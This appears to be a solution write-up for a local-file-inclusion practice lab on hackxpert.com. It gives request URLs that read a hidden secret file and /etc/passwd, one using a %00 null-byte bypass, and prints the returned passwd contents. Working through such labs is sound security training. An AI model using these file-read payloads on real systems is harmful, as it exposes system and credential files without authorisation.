#  XSS Rat Lab 
## URL :- `https://hackxpert.com/labs/LFI/`

Solutions -->

![image](https://user-images.githubusercontent.com/60841283/151112457-622654ab-b924-4df9-9623-94a5ef2337ee.png)

### 1st Search Box:

Enter : `test.txt`

Result : `https://hackxpert.com/labs/LFI/endPoint.php?field2_name=test.txt&submit=submit&parent_id=0`

Contents : `testsdsgdgfd`

Visit : `https://hackxpert.com/labs/LFI/endPoint.php?field2_name=secret.txt&submit=submit&parent_id=0`

Contents : `You should not be seeing this!! This is a secret file!! `

Visit : `https://hackxpert.com/labs/LFI/endPoint.php?field2_name=/etc/passwd`

Content :

```html
<div class="comment">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
landscape:x:111:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:113:116:MySQL Server,,,:/nonexistent:/bin/false
debian-tor:x:114:118::/var/lib/tor:/bin/false
ftp:x:115:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
Training:x:1000:1000::/var/www/html/Training/:/usr/sbin/nologin
nagios:x:1001:1001::/home/nagios:/bin/sh
toof:x:1002:1003::/home/toof:/bin/bash
openldap:x:116:120:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
dnsmasq:x:117:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
brandon:x:1003:1004:,,,:/home/brandon:/bin/bash
mayank_pandey01:x:1004:1005::/var/www/html/labs/mayank_pandey01:/usr/sbin/nologin
</div>
```

### 2nd Search box 

Visit : `https://hackxpert.com/labs/LFI/endPoint-2.php?field2_name=/etc/passwd%00&submit=submit&parent_id=0`

Output :
```html
<div class="comment">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
  --snip--
  --snip--
brandon:x:1003:1004:,,,:/home/brandon:/bin/bash
mayank_pandey01:x:1004:1005::/var/www/html/labs/mayank_pandey01:/usr/sbin/nologin
```
